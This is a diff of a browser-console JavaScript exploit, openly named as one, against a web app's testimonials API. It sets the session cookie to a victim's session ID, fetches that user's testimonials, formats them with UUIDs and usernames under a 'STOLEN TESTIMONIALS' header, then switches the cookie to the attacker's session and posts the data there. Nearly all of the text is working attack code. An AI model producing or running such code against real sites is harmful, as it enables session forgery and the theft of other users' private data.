@@ -1,13 +1,13 @@
-(async function transferWithVictimAttacker() {
+(async function stealAndPostVictimData() {
     
-    console.log("🚀 Starting transfer from 1369 (Victim) to 1333 (Attacker)...");
+    console.log("🚀 Fetching victim data from session 1369...");
 
-    // ====================== 1. GET Victim Data (1369) ======================
+    // Force Victim Session
     document.cookie = "session=1369; path=/";
     await new Promise(r => setTimeout(r, 500));
 
-    let victimData = [];
-    
+    let victimTestimonials = [];
+
     try {
         const res = await fetch('/api/testimonials', {
             method: 'GET',
@@ -15,49 +15,47 @@
         });
 
         if (res.ok) {
-            victimData = await res.json();
-            console.log("✅ Victim Data (1369) fetched:", victimData);
+            victimTestimonials = await res.json();
         }
     } catch (e) {
-        console.error("Failed to fetch victim data", e);
+        console.error("Fetch failed", e);
     }
 
-    // ====================== 2. Prepare Combined Content ======================
-    let victimContent = "";
+    // Format all victim data nicely
+    let victimFormatted = "";
 
-    if (Array.isArray(victimData) && victimData.length > 0) {
-        victimContent = victimData
-            .map(item => {
-                if (typeof item === 'string') return item;
-                if (item && item.content) return item.content;
-                return JSON.stringify(item);
-            })
-            .join(" | ");
-    } else if (victimData && victimData.content) {
-        victimContent = victimData.content;
+    if (Array.isArray(victimTestimonials) && victimTestimonials.length > 0) {
+        victimFormatted = victimTestimonials.map((item, index) => {
+            return `=== VICTIM TESTIMONIAL ${index + 1} ===\n` +
+                   `UUID     : ${item.uuid || "N/A"}\n` +
+                   `Content  : ${item.content || item}\n` +
+                   `Timestamp: ${item.timestamp || "N/A"}\n` +
+                   `Username : ${item.username || "N/A"}\n` +
+                   `User Name: ${item.user_name || "N/A"}\n`;
+        }).join("\n\n");
+    } else if (victimTestimonials) {
+        // Single object case
+        const item = victimTestimonials;
+        victimFormatted = `=== VICTIM TESTIMONIAL ===\n` +
+                         `UUID     : ${item.uuid || "N/A"}\n` +
+                         `Content  : ${item.content || item}\n` +
+                         `Timestamp: ${item.timestamp || "N/A"}\n` +
+                         `Username : ${item.username || "N/A"}\n` +
+                         `User Name: ${item.user_name || "N/A"}\n`;
     }
 
-    // Attacker's own previous data (you can change this)
-    const attackerPreviousData = "This is what attacker already posted before";
+    const finalContent = `🚨 STOLEN TESTIMONIALS FROM VICTIM\n\n` + 
+                        victimFormatted + 
+                        `\n\n=== END OF VICTIM DATA ===`;
 
-    // Final formatted content
-    const finalContent = `=== VICTIM DATA ===
-${victimContent || "No victim data found"}
-
-=== ATTACKER DATA ===
-${attackerPreviousData}
-
-=== SEPARATOR ===
-`;
-
-    console.log("\n📋 Final Content to be posted to 1333:\n");
+    console.log("\n📋 Final Content that will be posted to 1333:\n");
     console.log(finalContent);
 
-    // ====================== 3. POST to Attacker Session (1333) ======================
+    // ====================== POST TO ATTACKER (1333) ======================
     document.cookie = "session=1333; path=/";
     await new Promise(r => setTimeout(r, 600));
 
-    console.log("📤 Posting combined Victim + Attacker data to session=1333...");
+    console.log("📤 Posting victim data to session=1333...");
 
     await fetch('/api/testimonials', {
         method: 'POST',
@@ -70,13 +68,10 @@ ${attackerPreviousData}
             content: finalContent 
         })
     })
-    .then(r => {
-        console.log("POST Status:", r.status);
-        return r.text();
-    })
-    .then(text => console.log("POST Response:", text))
+    .then(r => r.text())
+    .then(text => console.log("✅ Posted Successfully | Status:", "OK"))
     .catch(err => console.error("POST Error:", err));
 
-    console.log("✅ Transfer Completed!");
+    console.log("🎯 All victim testimonials transferred to your session (1333)");
 
 })();
